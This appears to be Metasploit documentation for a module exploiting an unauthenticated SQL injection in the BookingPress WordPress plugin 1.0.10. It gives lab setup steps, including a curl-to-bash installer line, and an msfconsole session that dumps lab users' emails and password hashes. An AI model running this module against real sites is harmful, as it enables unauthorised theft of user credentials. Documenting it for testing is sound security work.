## Vulnerable Application

The BookingPress WordPress plugin before 1.0.11 fails to properly sanitize user supplied POST data before it is used in
a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to
unauthenticated users), leading to an unauthenticated SQL Injection.

### Setup
#### Ubuntu 20.04 with Docksal
Install Docksal:
```
sudo apt update
sudo apt install curl
bash <(curl -fsSL https://get.docksal.io)
sudo usermod -aG docker $USER
```

Reboot the VM (Docksal needs to be able to run `docker` without sudo)
```
msfuser@ubuntu:~$ fin project create
1. Name your project (lowercase alphanumeric, underscore, and hyphen): msf

2. What would you like to install?
   PHP based
    1.  Drupal 9 (Composer Version)
    2.  Drupal 9 (BLT Version)
    3.  Drupal 9
    4.  Drupal 7
    5.  Wordpress
    6.  Magento
    7. Laravel
    8. Symfony Skeleton
    9. Symfony WebApp
    10. Grav CMS
    11. Backdrop CMS

Go based
12. Hugo

JS based
13. Gatsby JS
14. Angular

HTML
15. Static HTML site

Custom
0. Custom git repository


Enter your choice (0-15): 5

Project folder:   /home/msfuser/msf
Project software: Wordpress
Source repo:      https://github.com/docksal/boilerplate-wordpress.git
Source branch:    <default>
Project URL:      http://msf.docksal

Do you wish to proceed? [y/n]: y

... 

Success: WordPress installed successfully.

real	0m10.112s
user	0m0.327s
sys	0m0.061s
Open http://msf-wp.docksal in your browser to verify the setup.
Admin panel: http://msf-wp.docksal/wp-admin. User/password: admin/admin  
 DONE!  Completed all initialization steps.
```

Download a vulnerable version of BookingPress
`wget https://downloads.wordpress.org/plugin/bookingpress-appointment-booking.1.0.10.zip`

Navigate to the wordpress admin page that was just setup by docksal:
`Admin panel: http://msf-wp.docksal/wp-admin. User/password: admin/admin`

Navigate to `Plugins` on the left hand menu, then select `Add New` then select `Upload Plugin`

Select `Browse...` and browse to the `bookingpress-appointment-booking.1.0.10.zip` file just downloaded, click `Install Now`

You should see the following output in the browser:
```
Installing Plugin from uploaded file: bookingpress-appointment-booking.1.0.10.zip

Unpacking the package…

Installing the plugin…

Plugin installed successfully.
```

Click `Activate Plugin`

The BookingPress plugin has to be in use on the wordpress site in order to exploit the vulnerability:

1. Create a new "category" and associate it with a new "service" via the BookingPress admin menu
   (/wp-admin/admin.php?page=bookingpress_services)
1. Create a new page on the wordpress site that you've just set up by clicking `+ New` at the top of the screen and then
   select `Page` from the dropdown.
1. Paste `[bookingpress_form]` on the new page and click `publish`
1. Navigate to `/bookingpress/` and you should see BookPress running with the Category / Service you created in step 1.

## Options

### BOOKING_PRESS_PAGE

The webpage that bookingPress is running on. Example: `/bookingpress/`

## Verification Steps

1. Start msfconsole
1. Do: `use gather/wp_bookingpress_category_services_sqli`
1. Set the options `RHOSTS` (you may also have to set `RPORT` and `BOOKING_PRESS_PAGE` depending on how the target is configured)
1. Run the module
1. Receive `Wordpress User Credentials` information displayed in a table

## Scenarios
### Booking Press 1.0.10, Wordpress Running Via Docksal, Ubuntu 20.04
```
msf6 > use gather/wp_bookingpress_category_services_sqli
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set rhosts localhost
rhosts => localhost
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set rport 8000
rport => 8000
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > run

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Found 5 users in the database
[*] Extracting credential information
Wordpress User Credentials
==========================

 Username       Email                         Hash
 --------       -----                         ----
 admin          admin@admin.com               $P$BfxUckldN6AiHPD0BK6jg58se2b.aL.
 hackerman      hackerman@hacktheworld.io     $P$BESfz7bqSOY8VkUfuYXAZ/bT5E36ww/
 mr_metasploit  mr_metasploit@metaslpoit.org  $P$BDb8pIfym5dS6WTnNU8vU5Uk6i89fk.
 msfuser        msfuser@rapid7.com            $P$BpITVDPiqOZ7fyQbI5g9rsgUvZQFBd1
 todd           todd@toddtown.com             $P$BnlpkVgxGFWnmvdDQ3JStgpIx8LMFj0

[*] Auxiliary module execution completed
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set AutoCheck false
AutoCheck => false
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > run

[!] AutoCheck is disabled, proceeding with exploitation
[*] Found 5 users in the database
[*] Extracting credential information
Wordpress User Credentials
==========================

 Username       Email                         Hash
 --------       -----                         ----
 admin          admin@admin.com               $P$BfxUckldN6AiHPD0BK6jg58se2b.aL.
 hackerman      hackerman@hacktheworld.io     $P$BESfz7bqSOY8VkUfuYXAZ/bT5E36ww/
 mr_metasploit  mr_metasploit@metaslpoit.org  $P$BDb8pIfym5dS6WTnNU8vU5Uk6i89fk.
 msfuser        msfuser@rapid7.com            $P$BpITVDPiqOZ7fyQbI5g9rsgUvZQFBd1
 todd           todd@toddtown.com             $P$BnlpkVgxGFWnmvdDQ3JStgpIx8LMFj0

[*] Auxiliary module execution completed
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) >
```
